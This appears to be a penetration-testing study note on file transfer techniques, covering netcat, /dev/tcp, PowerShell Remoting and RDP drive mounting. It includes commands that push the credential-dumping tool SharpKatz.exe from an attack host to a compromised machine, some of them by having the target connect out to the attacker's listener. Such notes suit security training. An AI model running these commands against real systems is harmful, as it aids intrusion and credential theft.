---
title: File_Transfer_Netcat
tags:
  - netcat
  - file_sharing
  - rdp
  - winrm
created: 2025-02-25
---

# Miscellaneous_File_Transfers
## File Transfer with Netcat
The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
### Sending File
#### Target host listening on port 8000
```sh
nc -l -p 8000 > SharpKatz.exe
```

#### Attack host sending file to compromised machine
```sh
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Sending File as Input to Netcat
Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
####  Attack host listening on port 443
```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Target host  connecting to receive a file
```sh
nc 192.168.49.128 443 > SharpKatz.exe
```

##### Target host using /dev/tcp to receive a file
```sh
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## PowerShell Remoting for File Transfer

PowerShell Remoting (WinRM) allows executing scripts or commands on remote machines and can be used for file transfer operations. By default, enabling PowerShell Remoting creates both an HTTP and an HTTPS listener:

- **TCP/5985** for HTTP
- **TCP/5986** for HTTPS
### Prerequisites

- Administrative access on the target system or membership in the **Remote Management Users** group.
- PowerShell Remoting enabled on the remote machine.

### Confirm WinRM Connectivity

```powershell
PS C:\htb> whoami
htb\administrator

PS C:\htb> hostname
DC01

PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

### Create a PowerShell Remoting Session

```
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

### File Transfer Using PowerShell Remoting

#### Copying from Localhost (DC01) to Remote Session (DATABASE01)

```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copying from Remote Session (DATABASE01) to Localhost (DC01)

```
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP File Transfer

### Using Copy & Paste

- Copy a file from the local machine and paste it into the RDP session.    
- Works natively in Windows using **mstsc.exe**.
- **Limitations:** May not work in all cases, especially with certain configurations or restrictions.

### Using a Mounted Local Folder (Linux to RDP)

#### Mounting a Folder with `rdesktop`

```bash
rdesktop <target_ip> -d <domain> -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Folder with `xfreerdp`

```bash
xfreerdp /v:<target_ip> /d:<domain> /u:administrator /p:'Password0@' /drive:linux,/home/user/rdesktop/files
```

### Accessing the Mounted Drive

- The mounted folder can be accessed in the RDP session via `\\tsclient\`.
- Only accessible by the logged-in RDP user.
- Alternatively from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.